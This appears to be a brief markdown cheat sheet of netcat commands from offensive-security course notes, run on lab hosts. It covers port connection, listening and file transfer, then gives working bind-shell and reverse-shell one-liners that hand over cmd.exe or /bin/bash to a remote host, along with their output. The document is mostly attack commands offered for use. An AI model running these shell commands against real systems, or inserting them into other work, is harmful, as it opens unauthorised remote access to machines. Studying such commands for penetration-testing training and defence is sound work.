# Netcat

* connect to port
  ```
  # nc -nv 10.0.05 110
  ```

* listen on port
  ```
  # nc -nlvp 4444
  listening on [any] 4444 ...
  ```

* transfer files

  ```
  # nc -nlvp 4444 > incoming.exe
  listening on [any] 4444 ...
  ```

  ```
  # locate wget.exe
  # nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe
  (UNKNOWN) [10.0.0.22] 4444 (?) open
  ```

* netcat bind shell
  ```
  C:\Users\offsec>nc -nlvp 4444 -e cmd.exe
  listening on [any] 4444 ...
  ```

  ```
  root@kali:~# nc 10.0.0.5 4444
  ```

* Reverse shell
  ```
  C:\Users\offsec>nc -nlvp 4444
  listening on [any] 4444 ...
  ```

  ```
  root@kali:~# nc -nv 10.0.0.22 4444 -e /bin/bash
  (UNKNOWN) [10.0.0.22] 4444 (?) open
  ```
